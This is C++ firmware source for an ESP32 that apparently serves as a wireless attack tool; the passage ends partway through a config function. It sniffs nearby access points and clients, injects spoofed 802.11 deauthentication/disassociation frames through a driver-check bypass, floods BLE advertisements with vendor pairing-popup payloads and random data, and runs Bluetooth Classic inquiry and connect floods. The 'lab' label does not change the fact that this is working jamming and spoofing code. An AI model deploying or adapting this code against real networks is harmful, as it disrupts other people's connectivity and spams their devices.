/*
 * ESP32 deauth lab controller — NDJSON @ 921600 over USB-UART bridge.
 * TX is restricted to BSSIDs placed in g_targets by an explicit command.
 * Build: pio run -e esp32dev -t upload
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>
#include <BLEDevice.h>
#include <BluetoothSerial.h>
#include <esp_bt.h>
#include <esp_gap_bt_api.h>
#include <esp_gap_ble_api.h>

#include <atomic>
#include <cctype>
#include <cstdio>
#include <cstring>

extern "C" esp_err_t esp_wifi_80211_tx_bypass(
    wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

#define FW_VERSION      "1.0.0-jam"
#define SERIAL_BAUD     921600
#define RX_LINE_MAX     1024
#define FRAME_MAX       256
#define RING_LEN        24
#define MAX_APS         48
#define MAX_STAS        64
#define MAX_TARGETS     16

static const uint8_t kBroadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

/* ---- BLE advertising payloads ------------------------------------------ */

static uint8_t bleAirpods[] = {
  0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
  0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0
};
static uint8_t bleSamsung[] = {
  0x0e,0xff,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xff,0x00,0x00,0x43,0x00
};
static uint8_t bleGoogle[] = {
  0x03,0x03,0x2c,0xfe,0x06,0x16,0x2c,0xfe,0x00,0x00
};
static uint8_t bleSwift[] = {
  0x03,0x03,0x5f,0xfd,0x0a,0xff,0x06,0x00,0x03,0x00,0x80,0x00,0x00,0x00
};
static uint8_t *bleVendorPayloads[] = { bleAirpods, bleSamsung, bleGoogle, bleSwift };
static uint8_t bleVendorLens[] = {
  sizeof(bleAirpods), sizeof(bleSamsung), sizeof(bleGoogle), sizeof(bleSwift)
};
#define BLE_VENDOR_COUNT (sizeof(bleVendorPayloads) / sizeof(bleVendorPayloads[0]))

static uint8_t bleRandomAdv[31];

/* ---- state ------------------------------------------------------------- */

struct Config {
  uint16_t intervalMs  = 5;      // delay antar frame dalam satu burst
  uint16_t burst       = 8;      // frame per burst
  uint16_t burstGapMs  = 30;     // jeda antar burst
  uint8_t  channel     = 6;      // channel TX + sniff
  bool     hop         = false;  // sweep 1..13
  uint16_t hopMs       = 200;    // dwell per channel saat hop
  uint16_t reason      = 7;      // deauth reason code
  bool     broadcast   = true;   // true -> deauth ke broadcast per BSSID
  bool     disassoc    = false;  // true -> subtype disassoc (0xA0)
  uint16_t statsMs     = 2000;   // 0 = matikan status periodik
  uint16_t repeatMs    = 1500;   // kirim ulang AP/client yang sama
  int8_t   rssiMin     = -95;

  // BLE advertising flood
  uint8_t  bleMode       = 1;    // 1 vendor, 2 random, 3 both, 4 custom
  uint16_t bleAdvMs      = 25;
  uint16_t bleBurstGapMs = 10;
  int8_t   blePower      = 9;    // ESP_PWR_LVL_P9

  // Bluetooth Classic (BR/EDR)
  uint8_t  btMode     = 1;      // 1 inquiry flood, 2 connect/disconnect, 3 both
  uint16_t btHoldMs   = 400;    // durasi inquiry / koneksi
  uint16_t btGapMs    = 100;    // jeda antar siklus
  uint16_t btScanMs   = 15000;  // durasi auto scan
  bool     btAutoAdd  = false;  // otomatis masukkan hasil scan ke target
};

struct ApEntry {
  bool     used = false;
  uint8_t  bssid[6];
  char     ssid[33];
  uint8_t  ch = 0;
  int8_t   rssi = -127;
  uint8_t  auth = 0;       // 0 open, 1 wep, 2 wpa, 3 wpa2
  bool     hidden = false;
  uint16_t hits = 0;
  uint32_t lastSeen = 0;
  uint32_t lastEmit = 0;
};

struct StaEntry {
  bool     used = false;
  uint8_t  mac[6];
  uint8_t  bssid[6];
  uint8_t  ch = 0;
  int8_t   rssi = -127;
  uint16_t hits = 0;
  uint32_t lastSeen = 0;
  uint32_t lastEmit = 0;
};

struct Target {
  bool used = false;
  uint8_t bssid[6];
};

struct StaTarget {
  bool used = false;
  uint8_t mac[6];
  uint8_t bssid[6];
};

struct RawFrame {
  uint16_t len = 0;
  int8_t   rssi = -127;
  uint8_t  ch = 0;
  uint8_t  kind = 0;       // 1 = AP mgmt, 2 = STA data
  uint8_t  data[FRAME_MAX];
};

static Config   g_cfg;
static ApEntry  g_aps[MAX_APS];
static StaEntry g_stas[MAX_STAS];
static Target   g_targets[MAX_TARGETS];
static StaTarget g_staTargets[MAX_STAS];

static bool     g_jamming = false;
static uint8_t  g_curCh = 6;
static uint32_t g_txCount = 0;
static uint32_t g_txErrors = 0;
static int      g_txLastErr = 0;
static uint32_t g_sendCalls = 0;
static uint32_t g_injectCalls = 0;

static bool     g_bleInited = false;
static bool     g_bleRunning = false;
static bool     g_bleAdvActive = false;
static uint32_t g_bleLast = 0;
static uint32_t g_bleStart = 0;
static uint32_t g_bleSent = 0;
static uint32_t g_bleErrors = 0;
static uint8_t  g_bleCursor = 0;
static uint8_t  g_bleCustom[31] = {0};
static uint8_t  g_bleCustomLen = 0;

static bool     g_btRunning = false;
static bool     g_btInited = false;
static bool     g_btDiscoveryActive = false;
static bool     g_btConnected = false;
static uint32_t g_btLast = 0;
static uint32_t g_btStart = 0;
static uint32_t g_btSent = 0;
static uint32_t g_btErrors = 0;
static uint8_t  g_btCursor = 0;
static Target   g_btTargets[MAX_TARGETS];
static BluetoothSerial *g_btSerial = nullptr;

struct BtDev {
  bool     used = false;
  uint8_t  mac[6];
  char     name[40];
  int8_t   rssi = -127;
  uint32_t cod = 0;
  uint16_t hits = 0;
  uint32_t lastSeen = 0;
  bool     nameOnly = false;
};
#define MAX_BT_DEVS 48
static BtDev   g_btDevs[MAX_BT_DEVS];
static Target  g_btNameAsked[MAX_BT_DEVS];
static uint16_t g_btDevCount = 0;
static BtDev   g_btPending;
static volatile bool g_btPendingNew = false;
static bool     g_btScanning = false;
static bool     g_btAutoAdd = false;
static uint32_t g_btScanStarted = 0;
static uint32_t g_btScanMs = 15000;
static bool     g_btRestartScan = false;
static bool     g_btLimited = false;
static uint16_t g_btEvict = 0;
static uint32_t g_sniffFrames = 0;
static uint32_t g_rxDrops = 0;
static uint32_t g_ringDrops = 0;
static uint16_t s_uniqueAp = 0;
static uint16_t s_uniqueSta = 0;
static uint16_t s_evictAp = 0;
static uint16_t s_evictSta = 0;

/* ---- serial out -------------------------------------------------------- */

static void sendJson(JsonDocument &d) {
  serializeJson(d, Serial);
  Serial.write('\n');
}

static void emitConfig();

static void ack(bool ok, const char *msg, const char *cmd) {
  JsonDocument d;
  d["type"] = "rsp";
  d["ok"]   = ok;
  d["cmd"]  = cmd ? cmd : "";
  d["msg"]  = msg;
  sendJson(d);
}

/* ---- helpers ----------------------------------------------------------- */

static bool macEq(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

static void macToStr(const uint8_t *m, char *out18) {
  snprintf(out18, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           m[0], m[1], m[2], m[3], m[4], m[5]);
}

static bool parseMac(const char *s, uint8_t out[6]) {
  if (!s || strlen(s) != 17) return false;
  unsigned int m[6];
  if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
             &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)m[i];
  return true;
}

static uint8_t parseHexBytes(const char *s, uint8_t *out, uint8_t maxLen) {
  uint8_t n = 0;
  while (s && *s && n < maxLen) {
    while (*s == ' ' || *s == ':' || *s == '-') s++;
    if (!*s) break;
    if (!isxdigit((unsigned char)s[0]) || !isxdigit((unsigned char)s[1])) return 0;
    char b[3] = { s[0], s[1], 0 };
    out[n++] = (uint8_t)strtoul(b, nullptr, 16);
    s += 2;
  }
  return n;
}

static const char *authStr(uint8_t a) {
  switch (a) {
    case 1: return "wep";
    case 2: return "wpa";
    case 3: return "wpa2";
    default: return "open";
  }
}

/* ---- BLE flood (Bluedroid) --------------------------------------------- */

static esp_ble_adv_params_t bleAdvParams;

static void bleRandomMac(uint8_t m[6]) {
  for (int i = 0; i < 6; i++) m[i] = esp_random() & 0xFF;
  m[5] = (m[5] & 0x3F) | 0xC0;
}

static void bleInit() {
  if (g_bleInited) return;
  BLEDevice::init("wrecon-ble");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)g_cfg.blePower);
  memset(&bleAdvParams, 0, sizeof(bleAdvParams));
  bleAdvParams.adv_int_min       = 0x20;
  bleAdvParams.adv_int_max       = 0x20;
  bleAdvParams.adv_type          = ADV_TYPE_NONCONN_IND;
  bleAdvParams.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
  bleAdvParams.channel_map       = ADV_CHNL_ALL;
  bleAdvParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
  g_bleInited = true;
}

static void bleBuildRandom() {
  bleRandomAdv[0] = 0x02; bleRandomAdv[1] = 0x01; bleRandomAdv[2] = 0x06;
  bleRandomAdv[3] = 0x1b; bleRandomAdv[4] = 0xFF;
  bleRandomAdv[5] = esp_random() & 0xFF;
  bleRandomAdv[6] = esp_random() & 0xFF;
  for (int i = 7; i < 31; i++) bleRandomAdv[i] = esp_random() & 0xFF;
}

static void bleEmit(uint8_t *data, uint8_t len) {
  uint8_t mac[6];
  bleRandomMac(mac);
  esp_ble_gap_set_rand_addr(mac);
  esp_ble_gap_config_adv_data_raw(data, len);
  delay(3);
  if (esp_ble_gap_start_advertising(&bleAdvParams) == ESP_OK) {
    g_bleAdvActive = true;
    g_bleStart = millis();
  } else {
    g_bleErrors++;
  }
}

static void bleTick() {
  if (!g_bleRunning) return;
  uint32_t now = millis();

  if (g_bleAdvActive) {
    if ((uint32_t)(now - g_bleStart) >= g_cfg.bleAdvMs) {
      esp_ble_gap_stop_advertising();
      g_bleAdvActive = false;
      g_bleLast = now;
    }
    return;
  }
  if ((uint32_t)(now - g_bleLast) < g_cfg.bleBurstGapMs) return;

  uint8_t *data = bleRandomAdv;
  uint8_t len = sizeof(bleRandomAdv);
  switch (g_cfg.bleMode) {
    case 1:
      len = bleVendorLens[g_bleCursor % BLE_VENDOR_COUNT];
      data = bleVendorPayloads[g_bleCursor++ % BLE_VENDOR_COUNT];
      break;
    case 2:
      bleBuildRandom();
      break;
    case 3:
      if (g_bleCursor % 2 == 0) {
        bleBuildRandom();
      } else {
        uint8_t i = (g_bleCursor / 2) % BLE_VENDOR_COUNT;
        data = bleVendorPayloads[i];
        len = bleVendorLens[i];
      }
      g_bleCursor++;
      break;
    case 4:
      if (g_bleCustomLen) { data = g_bleCustom; len = g_bleCustomLen; }
      else { bleBuildRandom(); }
      break;
    default:
      bleBuildRandom();
      break;
  }
  bleEmit(data, len);
  g_bleLast = now;
  g_bleSent++;
}

/* ---- Bluetooth Classic (BR/EDR) ---------------------------------------- */

static void btGapCb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
  if (event == ESP_BT_GAP_DISC_STATE_CHANGED_EVT) {
    if (param->disc_st_chg.state == ESP_BT_GAP_DISCOVERY_STOPPED && g_btScanning) {
      g_btRestartScan = true;  // sweep berikutnya (general <-> limited)
    }
    return;
  }
  if (g_btPendingNew) return;

  if (event == ESP_BT_GAP_READ_REMOTE_NAME_EVT) {
    if (param->read_rmt_name.stat != ESP_BT_STATUS_SUCCESS) return;
    memset(&g_btPending, 0, sizeof(g_btPending));
    memcpy(g_btPending.mac, param->read_rmt_name.bda, 6);
    uint8_t n = 0;
    while (n < sizeof(g_btPending.name) - 1 && param->read_rmt_name.rmt_name[n]) n++;
    memcpy(g_btPending.name, param->read_rmt_name.rmt_name, n);
    g_btPending.name[n] = 0;
    g_btPending.nameOnly = true;
    g_btPendingNew = true;
    return;
  }

  if (event != ESP_BT_GAP_DISC_RES_EVT) return;

  memset(&g_btPending, 0, sizeof(g_btPending));
  memcpy(g_btPending.mac, param->disc_res.bda, 6);
  g_btPending.rssi = -127;
  for (int i = 0; i < param->disc_res.num_prop; i++) {
    esp_bt_gap_dev_prop_t &p = param->disc_res.prop[i];
    if (p.type == ESP_BT_GAP_DEV_PROP_BDNAME && p.val && p.len > 0) {
      uint8_t n = (uint8_t)min(p.len, (int)sizeof(g_btPending.name) - 1);
      memcpy(g_btPending.name, p.val, n);
      g_btPending.name[n] = 0;
    } else if (p.type == ESP_BT_GAP_DEV_PROP_RSSI && p.val && p.len >= 1) {
      g_btPending.rssi = ((int8_t *)p.val)[0];
    } else if (p.type == ESP_BT_GAP_DEV_PROP_COD && p.val && p.len >= 4) {
      g_btPending.cod = *(uint32_t *)p.val;
    }
  }

  if (!g_btPending.name[0]) {
    bool asked = false;
    for (uint16_t i = 0; i < MAX_BT_DEVS; i++) {
      if (g_btNameAsked[i].used && memcmp(g_btNameAsked[i].bssid, g_btPending.mac, 6) == 0) {
        asked = true;
        break;
      }
    }
    if (!asked) {
      for (uint16_t i = 0; i < MAX_BT_DEVS; i++) {
        if (g_btNameAsked[i].used) continue;
        g_btNameAsked[i].used = true;
        memcpy(g_btNameAsked[i].bssid, g_btPending.mac, 6);
        esp_bt_gap_read_remote_name(g_btPending.mac);
        break;
      }
    }
  }
  g_btPendingNew = true;
}

static void btInit() {
  if (g_btInited) return;
  g_btSerial = new BluetoothSerial();
  g_btSerial->begin("wrecon-classic", false);
  esp_bt_gap_register_callback(btGapCb);
  g_btInited = true;
}

static void btScanPoll() {
  if (!g_btPendingNew) return;
  BtDev incoming = g_btPending;
  g_btPendingNew = false;

  BtDev *e = nullptr;
  for (uint16_t i = 0; i < MAX_BT_DEVS; i++) {
    if (!g_btDevs[i].used) continue;
    if (memcmp(g_btDevs[i].mac, incoming.mac, 6) == 0) { e = &g_btDevs[i]; break; }
  }
  if (!e) {
    for (uint16_t i = 0; i < MAX_BT_DEVS; i++) {
      if (!g_btDevs[i].used) { e = &g_btDevs[i]; break; }
    }
    if (!e) e = &g_btDevs[g_btEvict++ % MAX_BT_DEVS];
    *e = incoming;
    e->used = true;
    g_btDevCount++;
  }
  if (!incoming.nameOnly) {
    e->hits++;
    e->rssi = incoming.rssi;
    e->cod = incoming.cod;
  }
  e->lastSeen = millis();
  if (incoming.name[0]) memcpy(e->name, incoming.name, sizeof(e->name));

  char mac[18];
  macToStr(e->mac, mac);
  JsonDocument d;
  d["type"] = "bt_device";
  d["addr"] = mac;
  d["name"] = e->name;
  d["rssi"] = e->rssi;
  d["cod"] = e->cod;
  d["hits"] = e->hits;
  sendJson(d);

  if (g_btAutoAdd) {
    bool exists = false;
    for (uint16_t i = 0; i < MAX_TARGETS; i++) {
      if (g_btTargets[i].used && memcmp(g_btTargets[i].bssid, e->mac, 6) == 0) { exists = true; break; }
    }
    if (!exists) {
      for (uint16_t i = 0; i < MAX_TARGETS; i++) {
        if (g_btTargets[i].used) continue;
        g_btTargets[i].used = true;
        memcpy(g_btTargets[i].bssid, e->mac, 6);
        emitConfig();
        break;
      }
    }
  }
}

static void btStartDiscovery() {
  uint8_t inqLen = (uint8_t)constrain((int)(g_btScanMs / 1280), 1, 0x30);
  esp_bt_inq_mode_t mode = g_btLimited
    ? ESP_BT_INQ_MODE_LIMITED_INQUIRY
    : ESP_BT_INQ_MODE_GENERAL_INQUIRY;
  esp_bt_gap_start_discovery(mode, inqLen, 0);
}

static void btScanTick() {
  if (!g_btScanning) return;
  uint32_t elapsed = (uint32_t)(millis() - g_btScanStarted);
  if (elapsed >= g_btScanMs) {
    esp_bt_gap_cancel_discovery();
    g_btScanning = false;
    g_btRestartScan = false;
    JsonDocument d;
    d["type"] = "done";
    d["kind"] = "bt_scan";
    d["count"] = g_btDevCount;
    sendJson(d);
    return;
  }
  if (g_btRestartScan) {
    g_btRestartScan = false;
    g_btLimited = !g_btLimited;
    btStartDiscovery();
  }
}

static uint16_t setBtTargets(JsonArray arr) {
  for (uint16_t i = 0; i < MAX_TARGETS; i++) g_btTargets[i] = Target();
  uint16_t n = 0;
  for (size_t k = 0; k < arr.size() && n < MAX_TARGETS; k++) {
    const char *s = arr[k] | "";
    uint8_t m[6];
    if (!parseMac(s, m)) continue;
    g_btTargets[n].used = true;
    memcpy(g_btTargets[n].bssid, m, 6);
    n++;
  }
  return n;
}

static void btTick() {
  if (!g_btRunning) return;
  uint32_t now = millis();

  if (g_btDiscoveryActive || g_btConnected) {
    if ((uint32_t)(now - g_btStart) >= g_cfg.btHoldMs) {
      if (g_btDiscoveryActive) esp_bt_gap_cancel_discovery();
      if (g_btConnected && g_btSerial) g_btSerial->disconnect();
      g_btDiscoveryActive = false;
      g_btConnected = false;
      g_btLast = now;
      g_btSent++;
    }
    return;
  }
  if ((uint32_t)(now - g_btLast) < g_cfg.btGapMs) return;

  if (g_cfg.btMode & 1) {
    esp_err_t err = esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 0x08, 0);
    if (err == ESP_OK) {
      g_btDiscoveryActive = true;
      g_btStart = now;
    } else {
      g_btErrors++;
    }
    return;
  }

  if (g_cfg.btMode & 2) {
    btInit();
    uint8_t addr[6];
    bool haveTarget = false;
    for (uint16_t i = 0; i < MAX_TARGETS; i++) {
      if (!g_btTargets[i].used) continue;
      uint8_t m[6];
      memcpy(m, g_btTargets[i].bssid, 6);
      g_btCursor = (uint8_t)((g_btCursor + 1) % MAX_TARGETS);
      // cari entri aktif berikutnya secara sederhana
      for (uint16_t j = 0; j < MAX_TARGETS; j++) {
        uint16_t k = (uint16_t)((g_btCursor + j) % MAX_TARGETS);
        if (g_btTargets[k].used) { memcpy(m, g_btTargets[k].bssid, 6); g_btCursor = (uint8_t)k; break; }
      }
      memcpy(addr, m, 6);
      haveTarget = true;
      break;
    }
    if (!haveTarget) {
      for (int i = 0; i < 6; i++) addr[i] = esp_random() & 0xFF;
      addr[5] = (addr[5] & 0xFE) | 0x00;
    }
    bool ok = g_btSerial && g_btSerial->connect(addr);
    if (ok) {
      g_btConnected = true;
      g_btStart = now;
      g_btSent++;
    } else {
      g_btErrors++;
    }
  }
}

/* ---- promiscuous ring -------------------------------------------------- */

static RawFrame s_ring[RING_LEN];
static std::atomic<uint16_t> s_head{0};
static std::atomic<uint16_t> s_tail{0};

static void IRAM_ATTR sniffCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
  const uint8_t *f = pkt->payload;
  uint8_t kind = 0;

  if (type == WIFI_PKT_MGMT) {
    if (pkt->rx_ctrl.sig_len < 36) return;
    uint8_t sub = (f[0] >> 4) & 0x0F;
    if (sub != 0x08 && sub != 0x05) return;   // beacon / probe response
    kind = 1;
  } else if (type == WIFI_PKT_DATA) {
    if (pkt->rx_ctrl.sig_len < 24) return;
    bool toDS = (f[0] & 0x08) != 0;
    bool fromDS = (f[0] & 0x04) != 0;
    if (toDS == fromDS) return;               // ad-hoc / WDS, lewati
    kind = 2;
  } else {
    return;
  }

  uint16_t h = s_head.load(std::memory_order_relaxed);
  uint16_t next = (uint16_t)((h + 1) % RING_LEN);
  if (next == s_tail.load(std::memory_order_acquire)) {
    g_ringDrops++;
    return;
  }

  RawFrame &r = s_ring[h];
  uint16_t n = pkt->rx_ctrl.sig_len;
  if (n > FRAME_MAX) n = FRAME_MAX;
  r.len  = n;
  r.rssi = pkt->rx_ctrl.rssi;
  r.ch   = pkt->rx_ctrl.channel ? pkt->rx_ctrl.channel : g_curCh;
  r.kind = kind;
  memcpy(r.data, f, n);
  s_head.store(next, std::memory_order_release);
  g_sniffFrames++;
}

/* ---- parse AP beacon --------------------------------------------------- */

static void processAp(const RawFrame &r) {
  if (r.len < 36) return;
  const uint8_t *f = r.data;
  const uint8_t *bssid = f + 16;
  uint16_t capab = (uint16_t)f[34] | ((uint16_t)f[35] << 8);
  bool privacy = (capab & 0x0010) != 0;

  char ssid[33] = {0};
  uint8_t ssidLen = 0;
  uint8_t ch = r.ch;
  bool rsn = false, wpa = false;

  uint16_t i = 36;
  while ((uint16_t)(i + 2) <= r.len) {
    uint8_t id = f[i];
    uint8_t l  = f[i + 1];
    if ((uint16_t)(i + 2 + l) > r.len) break;
    const uint8_t *v = f + i + 2;
    if (id == 0 && l <= 32) {
      ssidLen = l;
      memcpy(ssid, v, l);
      ssid[l] = 0;
    } else if (id == 3 && l >= 1) {
      ch = v[0];
    } else if (id == 48) {
      rsn = true;
    } else if (id == 221 && l >= 4 && v[0] == 0x00 && v[1] == 0x50 &&
               v[2] == 0xF2 && v[3] == 0x01) {
      wpa = true;
    }
    i += (uint16_t)(2 + l);
  }

  if (r.rssi < g_cfg.rssiMin) return;
  uint8_t auth = privacy ? (uint8_t)(rsn ? 3 : (wpa ? 2 : 1)) : 0;

  ApEntry *e = nullptr;
  ApEntry *freeSlot = nullptr;
  for (uint16_t k = 0; k < MAX_APS; k++) {
    if (!g_aps[k].used) { if (!freeSlot) freeSlot = &g_aps[k]; continue; }
    if (macEq(g_aps[k].bssid, bssid)) { e = &g_aps[k]; break; }
  }
  bool isNew = false;
  if (!e) {
    e = freeSlot ? freeSlot : &g_aps[s_evictAp++ % MAX_APS];
    *e = ApEntry();
    e->used = true;
    memcpy(e->bssid, bssid, 6);
    e->rssi = -127;
    isNew = true;
    s_uniqueAp++;
  }

  uint32_t now = millis();
  int8_t oldRssi = e->rssi;
  e->hits++;
  e->lastSeen = now;
  e->ch = ch;
  e->rssi = r.rssi;
  e->auth = auth;
  e->hidden = (ssidLen == 0);
  if (ssidLen) memcpy(e->ssid, ssid, ssidLen + 1); else e->ssid[0] = 0;

  bool due = g_cfg.repeatMs && (uint32_t)(now - e->lastEmit) >= g_cfg.repeatMs;
  bool moved = abs((int)r.rssi - (int)oldRssi) >= 6;
  if (!isNew && !due && !moved) return;
  e->lastEmit = now;

  char mac[18];
  macToStr(e->bssid, mac);
  JsonDocument d;
  d["type"]  = "wifi";
  d["ts"]    = now;
  d["bssid"] = mac;
  if (!e->hidden) d["ssid"] = e->ssid;
  d["hidden"] = e->hidden;
  d["ch"]     = e->ch;
  d["rssi"]   = e->rssi;
  d["auth"]   = authStr(e->auth);
  d["hits"]   = e->hits;
  sendJson(d);
}

/* ---- parse STA data frame --------------------------------------------- */

static void processSta(const RawFrame &r) {
  if (r.len < 24) return;
  const uint8_t *f = r.data;
  bool toDS = (f[0] & 0x08) != 0;
  bool fromDS = (f[0] & 0x04) != 0;
  const uint8_t *sta, *bssid;
  if (toDS && !fromDS) {
    bssid = f + 4;
    sta   = f + 10;
  } else if (fromDS && !toDS) {
    sta   = f + 4;
    bssid = f + 10;
  } else {
    return;
  }

  bool zeroSta = true;
  for (int i = 0; i < 6; i++) if (sta[i]) { zeroSta = false; break; }
  if (zeroSta) return;

  StaEntry *e = nullptr;
  StaEntry *freeSlot = nullptr;
  for (uint16_t k = 0; k < MAX_STAS; k++) {
    if (!g_stas[k].used) { if (!freeSlot) freeSlot = &g_stas[k]; continue; }
    if (macEq(g_stas[k].mac, sta) && macEq(g_stas[k].bssid, bssid)) {
      e = &g_stas[k];
      break;
    }
  }
  bool isNew = false;
  if (!e) {
    e = freeSlot ? freeSlot : &g_stas[s_evictSta++ % MAX_STAS];
    *e = StaEntry();
    e->used = true;
    memcpy(e->mac, sta, 6);
    memcpy(e->bssid, bssid, 6);
    e->rssi = -127;
    isNew = true;
    s_uniqueSta++;
  }

  uint32_t now = millis();
  int8_t oldRssi = e->rssi;
  e->hits++;
  e->lastSeen = now;
  e->ch = r.ch;
  e->rssi = r.rssi;
  bool due = g_cfg.repeatMs && (uint32_t)(now - e->lastEmit) >= g_cfg.repeatMs;
  bool moved = abs((int)r.rssi - (int)oldRssi) >= 6;
  if (!isNew && !due && !moved) return;
  e->lastEmit = now;

  char mac[18], ap[18];
  macToStr(e->mac, mac);
  macToStr(e->bssid, ap);
  JsonDocument d;
  d["type"]  = "client";
  d["ts"]    = now;
  d["addr"]  = mac;
  d["bssid"] = ap;
  d["ch"]    = e->ch;
  d["rssi"]  = e->rssi;
  d["hits"]  = e->hits;
  sendJson(d);
}

/* ---- target maintenance ------------------------------------------------ */

static void clearTargets() {
  for (uint16_t i = 0; i < MAX_TARGETS; i++) g_targets[i] = Target();
  for (uint16_t i = 0; i < MAX_STAS; i++) g_staTargets[i] = StaTarget();
}

static uint16_t setTargetsFromJson(JsonArray arr) {
  clearTargets();
  uint16_t n = 0;
  for (size_t k = 0; k < arr.size() && n < MAX_TARGETS; k++) {
    const char *s = arr[k] | "";
    uint8_t m[6];
    if (!parseMac(s, m)) continue;
    bool dup = false;
    for (uint16_t i = 0; i < n; i++) if (macEq(g_targets[i].bssid, m)) { dup = true; break; }
    if (dup) continue;
    g_targets[n].used = true;
    memcpy(g_targets[n].bssid, m, 6);
    n++;
  }
  return n;
}

static uint16_t setStaTargetsFromJson(JsonArray arr) {
  for (uint16_t i = 0; i < MAX_STAS; i++) g_staTargets[i] = StaTarget();
  uint16_t n = 0;
  for (size_t k = 0; k < arr.size() && n < MAX_STAS; k++) {
    const char *s = arr[k] | "";
    uint8_t m[6];
    if (!parseMac(s, m)) continue;

    uint8_t bssid[6] = {0};
    for (uint16_t j = 0; j < MAX_STAS; j++) {
      if (g_stas[j].used && macEq(g_stas[j].mac, m)) {
        memcpy(bssid, g_stas[j].bssid, 6);
        break;
      }
    }
    if (!bssid[0] && !bssid[1] && !bssid[2] &&
        !bssid[3] && !bssid[4] && !bssid[5]) continue;  // client belum terlihat

    bool dup = false;
    for (uint16_t i = 0; i < n; i++) if (macEq(g_staTargets[i].mac, m)) { dup = true; break; }
    if (dup) continue;
    g_staTargets[n].used = true;
    memcpy(g_staTargets[n].mac, m, 6);
    memcpy(g_staTargets[n].bssid, bssid, 6);
    n++;
  }
  return n;
}

/* ---- TX ---------------------------------------------------------------- */

static void injectFrame(const uint8_t *bssid, const uint8_t *sta) {
  g_injectCalls++;
  uint8_t frame[26];
  frame[0] = g_cfg.disassoc ? 0xA0 : 0xC0;   // mgmt subtype: deauth / disassoc
  frame[1] = 0x00;
  frame[2] = 0x00;
  frame[3] = 0x00;
  memcpy(frame + 4,  sta,   6);               // addr1: receiver
  memcpy(frame + 10, bssid, 6);               // addr2: transmitter (spoof AP)
  memcpy(frame + 16, bssid, 6);               // addr3: BSSID
  frame[22] = 0x00;
  frame[23] = 0x00;
  frame[24] = (uint8_t)(g_cfg.reason & 0xFF);
  frame[25] = (uint8_t)((g_cfg.reason >> 8) & 0xFF);

  // Lewati check addr2 di driver supaya spoof BSSID benar-benar keluar.
  esp_err_t err = esp_wifi_80211_tx_bypass(WIFI_IF_STA, frame, sizeof(frame), false);
  if (err == ESP_OK) {
    g_txCount++;
  } else {
    g_txErrors++;
    g_txLastErr = (int)err;
  }
}

static uint16_t s_burstLeft = 0;
static uint32_t s_lastFrame = 0;
static uint32_t s_lastBurst = 0;
static uint16_t s_tCursor = 0;
static uint16_t s_cCursor = 0;

static void sendNext() {
  g_sendCalls++;
  uint16_t active = 0;
  for (uint16_t i = 0; i < MAX_TARGETS; i++) if (g_targets[i].used) active++;
  if (!active) return;

  if (!g_cfg.broadcast) {
    uint16_t cActive = 0;
    for (uint16_t i = 0; i < MAX_STAS; i++) if (g_staTargets[i].used) cActive++;
    if (cActive) {
      for (uint16_t n = 0; n < MAX_STAS; n++) {
        s_cCursor = (uint16_t)((s_cCursor + 1) % MAX_STAS);
        if (!g_staTargets[s_cCursor].used) continue;
        injectFrame(g_staTargets[s_cCursor].bssid, g_staTargets[s_cCursor].mac);
        return;
      }
    }
  }

  for (uint16_t n = 0; n < MAX_TARGETS; n++) {
    s_tCursor = (uint16_t)((s_tCursor + 1) % MAX_TARGETS);
    if (!g_targets[s_tCursor].used) continue;
    injectFrame(g_targets[s_tCursor].bssid, kBroadcast);
    return;
  }
}

static void jamTick() {
  if (!g_jamming) return;
  uint32_t now = millis();

  if (s_burstLeft == 0 && (uint32_t)(now - s_lastBurst) >= g_cfg.burstGapMs) {
    s_burstLeft = g_cfg.burst;
    s_lastBurst = now;
  }
  if (s_burstLeft == 0) return;
  if ((uint32_t)(now - s_lastFrame) < g_cfg.intervalMs) return;
  s_lastFrame = now;
  s_burstLeft--;
  sendNext();
}

/* ---- channel hop ------------------------------------------------------- */

static uint32_t s_lastHop = 0;
static uint8_t  s_hopCursor = 0;

static void hopTick() {
  uint32_t now = millis();
  if (g_cfg.hop) {
    uint16_t dwell = g_cfg.hopMs ? g_cfg.hopMs : 100;
    if (s_lastHop && (uint32_t)(now - s_lastHop) < dwell) return;
    s_lastHop = now;
    uint8_t c = (uint8_t)((s_hopCursor % 13) + 1);
    s_hopCursor = (uint8_t)(c % 13);
    if (c != g_curCh && esp_wifi_set_channel(c, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = c;
    }
  } else if (g_curCh != g_cfg.channel) {
    if (esp_wifi_set_channel(g_cfg.channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
      g_curCh = g_cfg.channel;
    }
  }
}

/* ---- status / config events ------------------------------------------- */

static void emitConfig() {
  JsonDocument d;
  d["type"] = "config";
  JsonObject p = d["params"].to<JsonObject>();
  p["interval_ms"]  = g_cfg.intervalMs;
  p["burst"]        = g_cfg.burst;
  p["burst_gap_ms"] = g_cfg.burstGapMs;
  p["channel"]      = g_cfg.channel;
  p["hop"]          = g_cfg.hop;
  p["hop_ms"]       = g_cfg.hopMs;
  p["reason"]       = g_cfg.reason;
  p["broadcast"]    = g_cfg.broadcast;
  p["disassoc"]     = g_cfg.disassoc;
  p["stats_ms"]     = g_cfg.statsMs;
  p["repeat_ms"]    = g_cfg.repeatMs;
  p["rssi_min"]     = g_cfg.rssiMin;
  p["ble_mode"]     = g_cfg.bleMode;
